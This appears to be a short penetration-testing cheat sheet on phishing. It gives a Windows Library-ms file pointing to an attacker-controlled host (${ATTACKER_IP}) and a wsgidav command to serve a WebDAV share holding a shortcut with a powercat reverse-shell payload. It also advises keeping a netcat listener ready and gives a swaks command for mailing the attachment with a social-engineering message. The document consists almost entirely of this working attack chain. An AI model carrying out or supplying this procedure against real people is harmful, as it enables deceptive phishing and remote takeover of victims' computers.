# Phishing

With a valid set of credentials for a mailserver of a domain, we can use swaks to send an email from an account.

The prep for this:

`config.Library-ms`:
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://${ATTACKER_IP}</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

make a link-file with the powercat payload.

Setup a `wsgidav` listener (make the root dir beforehand):

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav/
```

place the .link file in `./webdav` and write a body and header to social engineer the target to clicking the .link file in the `./webdav` folder.

have a `nc` listener ready on an approriate port.

When clicking the attacked `config.Library-ms` file on a windows machine, it will make a remote connection to the `wsgidav`-server and show it as if it's a local explorer.
Then, when the target clicks the link, we spawn a shell.


```
sudo swaks -t ${TARGET_1} -t ${TARGET_2} \
--from ${USER@DOMAIN} --attach @config.Library-ms \
--server ${MAIL_SERVER_IP} --body @body.txt \ 
--header "Subject: ${HEADER}" --suppress-data -ap
```
